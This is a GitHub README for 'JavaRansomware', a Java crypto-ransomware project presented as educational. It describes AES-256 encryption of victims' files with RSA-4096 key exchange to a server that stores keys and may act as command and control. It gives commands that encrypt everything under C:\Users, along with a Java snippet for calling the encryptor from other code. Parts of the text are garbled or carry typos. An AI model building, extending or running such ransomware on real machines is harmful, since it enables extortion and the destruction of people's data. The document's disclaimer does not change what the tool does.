# JavaRansomware
<p>Ransomware is malware for data kidnapping, an exploit in which the attacker encrypts the victim's dataRansomware stops you from using your PC.Ransomware spreads through e-mail attachments, infected programs and compromised websites. A ransomware malware program may also be called a cryptovirus, cryptotrojan or cryptoworm It holds your PC or files for "ransom".</p>

#What does ransomware do?
<p>There are different types of ransomware. However, all of them will prevent you from using your PC normally, and they will all ask you to do something before you can use your PC.

They can target any PC users, whether it’s a home computer, endpoints in an enterprise network, or servers used by a government agency or healthcare provider.

Ransomware can:</p>

* Prevent you from accessing Windows.

* Encrypt files so you can't use them.

* Stop certain apps from running (like your web browser).

<p>Ransomware will demand that you pay money (a “ransom”) to get access to your PC or files. We have also seen them make you complete surveys.

There is no guarantee that paying the fine or doing what the ransomware tells you will give access to your PC or files again.</p>

# Project Summary
This project aims to build an almost functional crypto-ransomware for educational purposes, written in in pure java. Basically, it will encrypt your files in background using AES-256, a strong encryption algorithm, using RSA-4096 to secure the key exchange with server. Yeah, a Cryptolocker like malware.

It is composed of two main parts, the server and the malware itself.

The server is responsible for store the Id and the respective encryption key and possibly act as a Command and Control server in the near future.

The malware encrypt with your RSA-4096 public key any payload before send then to the server. This approach with the https transport together make the security and authentication almost unbreakable (in theory)

#Usage and How it Works
<p>The easiest way to run this Project is to use the the .jar open a cmd terminal and simply run the below commands <p>

 ```
 $ cd JarPath
```

<p>Encrypt All Files in the Current Path <p>
 ```
 $ java -jar JavaRansomware.jar C:\Users Encrypt
```

<p>Decrypt All Files in the Current Path <p>
 ```
 $ java -jar JavaRansomware.jar C:\Users Decrypt
```
<p>if you want to use the project programmatically just put the below code in your project and simply run it. Don't forget to give Input arguments from the Command-Line Arguments. i've put  a printscreen to see how to give Paramaters<p>

<h2>Java Manual</h2>
```java
public class App {
 
    private static final String ENCRYPT = "ENCRYPT";
    private static final String DECRYPT = "DECRYPT";

    public static void main(String[] args) throws RansomwareException {

        Processing(args[0], args[1]);
    }

    private static void Processing(final String toSearch, final String attack) throws RansomwareException {
        final RansomProcess p = new RansomProcess(toSearch);

        if (attack.equalsIgnoreCase(ENCRYPT))
            p.StartEncryptProcess(PubicKey);
        else if (attack.equalsIgnoreCase(DECRYPT))
            p.StartDecryptProcess(PrivateKey);
        else
            throw new RansomwareException("Mismatched Values Try again with correct one");

    }

}
```
---

> DON'T RUN ransomware.exe IN YOUR PERSONAL MACHINE, EXECUTE ONLY IN A TEST ENVIRONMENT!

#Legal Warning
<p>While this may be helpful for some, there are significant risks. JavaRansomware may be used only for Educational Purposes. Do not use it as a ransomware! You could go to jail if if you will use it for malicious purposes.</p>


#Contribute
 1. Fork it: git clone https://github.com/PanagiotisDrakatos/JavaRansomware.git
 2. Create your feature branch: git checkout -b my-new-feature
 3. Commit your changes: git commit -am 'Add some feature'
 4. Push to the branch: git push origin my-new-feature
 5. Submit a pull request :D
 
#License
<p> This project is licensed under the MIT License - see the<a href="https://github.com/PanagiotisDrakatos/JavaRansomware/blob/master/LICENSE">Licence.md</a>file for details</p>
